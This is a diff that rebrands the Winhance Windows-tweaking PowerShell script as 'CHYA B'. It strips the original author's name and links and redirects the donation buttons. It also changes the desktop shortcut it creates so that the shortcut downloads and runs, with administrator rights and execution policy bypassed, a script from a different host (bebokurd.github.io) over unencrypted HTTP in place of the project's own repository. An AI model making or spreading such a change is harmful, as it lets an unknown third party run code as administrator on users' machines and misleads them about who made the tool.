@@ -1,6 +1,6 @@
 <#
 .SYNOPSIS
-Winhance - Windows Enhancement Utility - https://github.com/memstechtips/Winhance
+Winhance - Windows Enhancement Utility - http://bebokurd.github.io
 
 .DESCRIPTION
 Winhance is a PowerShell GUI application designed to optimize and customize Windows 10 and 11 systems. 
@@ -15,9 +15,9 @@ It features tools for:
 
 .AUTHOR
 Memory
-- https://github.com/memstechtips
-- https://memstechtips.com
-- https://youtube.com/@memstechtips
+- http://bebokurd.github.io/
+- http://chya.fwh.is/
+- http://chya.fwh.is/
 
 #>
 
@@ -7000,7 +7000,7 @@ $xaml = @'
                         FontSize="12"
                         FontStyle="Italic"
                         Foreground="Gray"
-                        Text="by Memory" />
+                        Text="by chya luqman" />
                 </TextBlock>
             </DockPanel>
             <!-- Buttons in Top-Right Corner  -->
@@ -7749,7 +7749,7 @@ Margin="27,0,0,0"/>
                 FontFamily="Helvetica Neue"
                 FontSize="14"
                 Foreground="DarkGray"
-                Text="Learn more about Winhance" />
+                Text="Learn more about CHYA B" />
                     </StackPanel>
                 </DockPanel>
                 <!-- Main Content -->
@@ -7766,13 +7766,13 @@ Margin="27,0,0,0"/>
                     FontWeight="Bold"
                     Foreground="{DynamicResource PrimaryTextColor}"
                     Margin="10,10,0,10"
-                    Text="Winhance" />
+                    Text="CHYA B" />
                             <TextBlock
     FontFamily="Helvetica Neue"
     FontSize="14"
     Foreground="{DynamicResource PrimaryTextColor}"
     Margin="10,0,0,10">
-    <Run Text="Winhance is a PowerShell GUI application designed to optimize and customize Windows 10 and 11 systems." />
+    <Run Text="CHYA B is a PowerShell GUI application designed to optimize and customize Windows 10 and 11 systems." />
     <LineBreak />
     <Run Text="It features tools for:" />
     <LineBreak />
@@ -7795,7 +7795,7 @@ Margin="27,0,0,0"/>
     FontSize="14"
     Foreground="{DynamicResource PrimaryTextColor}"
     Margin="10,10,0,10"
-    Text="Create Winhance Desktop Shortcut" />
+    Text="Create CHYA B Desktop Shortcut" />
                             <Button
     x:Name="CreateShortcutButton"
     Style="{DynamicResource PrimaryButtonStyle}"
@@ -8061,7 +8061,7 @@ $CloseButton.Add_Click({
 
         if ($showDialog) {
             $heart = [char]0x2764
-            $response = Show-MessageBox -Message "Thanks for using Winhance! $heart
+            $response = Show-MessageBox -Message "Thanks for using CHYA B! $heart
 
 If you found this tool helpful, please consider:
 - Making a small donation via PayPal
@@ -8073,8 +8073,8 @@ Click 'Yes' to show your support!" `
                 -Icon "Information"
 
             if ($response -eq 'Yes') {
-                Start-Process "https://github.com/memstechtips/Winhance"
-                Start-Process "https://paypal.me/memstech"
+                Start-Process "https://github.com/bebokurd/"
+                Start-Process "https://github.com"
             }
             else {
                 # Create new preferences hashtable
@@ -8617,7 +8617,7 @@ $CreateShortcutButton.Add_Click({
         $WshShell = New-Object -ComObject WScript.Shell
         $Shortcut = $WshShell.CreateShortcut($shortcutPath)
         $Shortcut.TargetPath = "powershell.exe"
-        $Shortcut.Arguments = "-ExecutionPolicy Bypass -Command `"Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command `"`"irm \`"https://github.com/memstechtips/Winhance/raw/main/Winhance.ps1\`" | iex`"`"' -Verb RunAs`""
+        $Shortcut.Arguments = "-ExecutionPolicy Bypass -Command `"Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command `"`"irm \`"http://bebokurd.github.io/pop/Winhance.ps1`" | iex`"`"' -Verb RunAs`""
         $Shortcut.IconLocation = "powershell.exe,0"
         $Shortcut.Save()
     
@@ -8651,7 +8651,7 @@ $SupportButton.Add_Click({
 # ====================================================================================================
 
 # Display disclaimer message before showing main window
-$agreement = Show-MessageBox -Message "Welcome to Winhance!
+$agreement = Show-MessageBox -Message "Welcome to chya b!
 
 This tool enhances your Windows experience by modifying system settings.
 
